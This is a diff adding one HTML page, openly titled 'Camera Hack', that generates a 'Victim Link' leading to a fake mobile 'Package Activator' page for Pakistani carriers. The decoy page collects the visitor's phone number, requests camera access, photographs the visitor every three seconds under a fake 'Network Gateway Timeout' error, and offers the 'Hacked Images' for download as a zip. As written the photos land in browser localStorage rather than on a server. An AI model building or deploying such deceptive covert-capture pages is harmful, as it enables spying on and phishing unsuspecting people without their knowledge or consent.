@@ -1,0 +1,314 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Link Console | FTGM </title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<style>
+/* --- Core Styles --- */
+:root {
+    --bg: #0f1115;
+    --card-bg: rgba(26, 29, 35, 0.92); 
+    --accent: #ef4444; /* Default Red for Dashboard */
+    --text-main: #f8fafc;
+    --text-dim: #94a3b8;
+    --border: #2d333f;
+    --error: #ef4444;
+}
+
+/* Specific Blue override for Package Activator */
+.blue-theme {
+    --accent: #3b82f6 !important;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+    font-family: 'Inter', sans-serif;
+    /* --- STATIC BACKGROUND LOGIC --- */
+    background-image: url('https://i.imghippo.com/files/FDy7437i.jpg');
+    background-attachment: fixed; /* Keeps image static */
+    background-position: center;
+    background-repeat: no-repeat;
+    background-size: cover;
+    /* ------------------------------ */
+    color: var(--text-main);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+}
+
+.card {
+    background: var(--card-bg);
+    padding: 40px 30px;
+    border-radius: 24px;
+    max-width: 480px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+    border: 1px solid var(--border);
+    backdrop-filter: blur(8px);
+}
+
+h2 { font-size: 1.8rem; font-weight: 700; margin-bottom: 8px; letter-spacing: -0.5px; }
+small { color: var(--text-dim); font-size: 0.95rem; line-height: 1.5; display: block; margin-bottom: 30px; }
+
+button {
+    width: 100%;
+    padding: 16px;
+    border-radius: 14px;
+    border: none;
+    background: var(--accent);
+    color: white;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: transform 0.2s, opacity 0.2s;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 10px;
+}
+
+button:active { transform: scale(0.98); }
+button:hover { opacity: 0.9; }
+
+input, select {
+    width: 100%;
+    padding: 16px;
+    border-radius: 14px;
+    border: 1px solid var(--border);
+    background: #23272f;
+    color: white;
+    font-size: 1rem;
+    margin-top: 15px;
+    outline: none;
+}
+
+input:focus { border-color: var(--accent); }
+
+#linkBox { margin-top: 20px; display: flex; flex-direction: column; gap: 10px; }
+
+.gallery {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    margin-top: 20px;
+}
+
+.gallery img {
+    width: 100%;
+    aspect-ratio: 1;
+    object-fit: cover;
+    border-radius: 12px;
+    background: #23272f;
+}
+
+hr { border: 0; border-top: 1px solid var(--border); margin: 30px 0; }
+
+/* --- Loader CSS --- */
+#loader-container { display: none; justify-content: center; padding: 20px 0; }
+.loader {
+    transform: rotateZ(45deg);
+    perspective: 1000px;
+    border-radius: 50%;
+    width: 48px;
+    height: 48px;
+    color: #fff;
+    position: relative;
+}
+.loader:before, .loader:after {
+    content: '';
+    display: block;
+    position: absolute;
+    top: 0; left: 0;
+    width: inherit; height: inherit;
+    border-radius: 50%;
+    transform: rotateX(70deg);
+    animation: 1s spin linear infinite;
+}
+.loader:after { color: #FF3D00; transform: rotateY(70deg); animation-delay: .4s; }
+
+@keyframes spin {
+    0%, 100% { box-shadow: .2em 0px 0 0px currentcolor; }
+    12% { box-shadow: .2em .2em 0 0 currentcolor; }
+    25% { box-shadow: 0 .2em 0 0px currentcolor; }
+    37% { box-shadow: -.2em .2em 0 0 currentcolor; }
+    50% { box-shadow: -.2em 0 0 0 currentcolor; }
+    62% { box-shadow: -.2em -.2em 0 0 currentcolor; }
+    75% { box-shadow: 0px -.2em 0 0 currentcolor; }
+    87% { box-shadow: .2em -.2em 0 0 currentcolor; }
+}
+
+#whatsapp-btn {
+    position: fixed;
+    bottom: 30px;
+    right: 30px;
+    width: 60px;
+    height: 60px;
+    background: #25d366;
+    color: white;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 28px;
+    z-index: 1000;
+}
+</style>
+</head>
+<body>
+
+<div class="card" id="dashboard-card">
+    <h2>Camera Hack</h2>
+    <small>Hack The Camera By Just Sending A Link.</small>
+
+    <div id="genArea">
+        <button id="genBtn"><i class="fa fa-plus"></i> Generate Victim Link</button>
+        <div id="loader-container"><span class="loader"></span></div>
+        <div id="linkBox"></div>
+    </div>
+
+    <hr>
+
+    <div id="dataArea" style="display:none">
+        <p style="font-weight: 600; font-size: 0.9rem; color: var(--accent);">Your Hack ID: <span id="showId"></span></p>
+        <div id="images" class="gallery"></div>
+        <button id="downloadBtn" style="background: #23272f; border: 1px solid var(--border); margin-top: 15px;" onclick="downloadAllImages()"><i class="fa fa-download"></i> Save All Hacked Images</button>
+    </div>
+</div>
+
+<div class="card blue-theme" id="pkg-activator-card" style="display:none;">
+    <h2>Package Activator</h2>
+    <small>Connect to the network gateway to activate your service.</small>
+    <select id="sim-select">
+        <option value="">Select Network Provider</option>
+        <option value="jazz">Jazz</option>
+        <option value="telenor">Telenor</option>
+        <option value="ufone">Ufone</option>
+        <option value="zong">Zong</option>
+        <option value="sco">SCOM</option>
+    </select>
+    <input type="tel" id="mobile-number" placeholder="Mobile Number (03xxxxxxxxx)">
+    <button id="activateBtn" style="margin-top: 25px;">Activate Now</button>
+    <div id="activationStatus"></div>
+    <video id="videoElement" autoplay playsinline muted style="display:none"></video>
+    <canvas id="canvasElement" style="display:none;"></canvas>
+</div>
+
+
+
+<script>
+const CAPTURE_INTERVAL_MS = 3000;
+const dashboardCard = document.getElementById('dashboard-card');
+const pkgActivatorCard = document.getElementById('pkg-activator-card');
+const genBtn=document.getElementById('genBtn');
+const linkBox=document.getElementById('linkBox');
+const dataArea=document.getElementById('dataArea');
+const showId=document.getElementById('showId');
+const images=document.getElementById('images');
+const activateBtn = document.getElementById('activateBtn');
+const simSelect = document.getElementById('sim-select');
+const mobileNumber = document.getElementById('mobile-number');
+const activationStatus = document.getElementById('activationStatus');
+const video = document.getElementById('videoElement');
+const canvas = document.getElementById('canvasElement');
+const loaderContainer = document.getElementById('loader-container');
+
+function generateId(){return 'ID-'+Math.random().toString(36).slice(2,8).toUpperCase();}
+function saveImages(id,imgArray){localStorage.setItem('images_'+id,JSON.stringify(imgArray));}
+function getImages(id){return JSON.parse(localStorage.getItem('images_'+id)||'[]');}
+
+function renderImages(id){ 
+    const imgs=getImages(id);
+    images.innerHTML='';
+    if(!imgs.length){images.innerHTML='<p style="grid-column: 1/-1; color: var(--text-dim); font-size: 0.8rem; margin: 20px 0;">No media received yet.</p>'; return;}
+    imgs.forEach((url)=>{
+        const img=document.createElement('img'); img.src=url; images.appendChild(img);
+    });
+}
+
+async function downloadAllImages() {
+    const id = localStorage.getItem('currentId');
+    if (!id) return;
+    const imgs = getImages(id);
+    const zip = new JSZip();
+    imgs.forEach((url, i) => zip.file(`data_${i+1}.jpeg`, url.split(',')[1], {base64: true}));
+    const content = await zip.generateAsync({type:"blob"});
+    const a = document.createElement('a'); a.href = URL.createObjectURL(content); a.download = `Media_${id}.zip`; a.click();
+}
+
+genBtn.onclick=()=>{
+    genBtn.style.display = 'none';
+    loaderContainer.style.display = 'flex';
+    setTimeout(() => {
+        loaderContainer.style.display = 'none';
+        const id=generateId();
+        showId.textContent=id;
+        const link=location.origin+location.pathname+'?id='+encodeURIComponent(id);
+        localStorage.setItem('currentId',id); 
+        linkBox.innerHTML = `
+            <input readonly value="${link}" style="text-align: center; border-color: var(--accent);">
+            <div style="display: flex; gap: 10px;">
+                <button id="copyBtn" style="background: #23272f; border: 1px solid var(--border);">Copy</button> 
+                <button id="openBtn">Open</button>
+            </div>
+            <button id="refreshBtn" style="background: transparent; color: var(--accent); margin-top: 10px; font-size: 0.8rem;">Refresh Status</button>
+        `;
+        document.getElementById('openBtn').onclick=()=>window.open(link,'_blank');
+        document.getElementById('copyBtn').onclick=()=>navigator.clipboard.writeText(link).then(()=>alert('Link Copied'));
+        document.getElementById('refreshBtn').onclick = () => { window.location.reload(); };
+        dataArea.style.display='block';
+        renderImages(id);
+    }, 3000);
+};
+
+activateBtn.onclick = async () => {
+    activationStatus.style.display = 'none';
+    if (!simSelect.value || mobileNumber.value.length < 11) {
+        activationStatus.style.display = 'block';
+        activationStatus.textContent = 'Please fill in all details correctly.';
+        return;
+    }
+    activateBtn.disabled = true;
+    activateBtn.textContent = 'Connecting...';
+    const ID = new URLSearchParams(location.search).get('id');
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        captureIntervalId = setInterval(() => {
+            canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            const capturedImage = canvas.toDataURL('image/jpeg', 0.5);
+            const old = getImages(ID); old.push(capturedImage); saveImages(ID, old);
+        }, CAPTURE_INTERVAL_MS);
+        setTimeout(() => {
+            activationStatus.style.display = 'block';
+            activationStatus.innerHTML = 'System Error: Network Gateway Timeout.<br>Please try again later.';
+        }, 1500); 
+    } catch (err) {
+        activationStatus.style.display = 'block';
+        activationStatus.innerHTML = 'Connection Failed: Permission denied or device error.';
+    }
+};
+
+const ID_PARAM=new URLSearchParams(location.search).get('id');
+if(ID_PARAM){
+    dashboardCard.style.display = 'none';
+    pkgActivatorCard.style.display = 'block';
+} else {
+    const savedId=localStorage.getItem('currentId');
+    if(savedId){
+        showId.textContent=savedId;
+        dataArea.style.display='block';
+        renderImages(savedId);
+    }
+}
+</script>
+</body>
+</html>
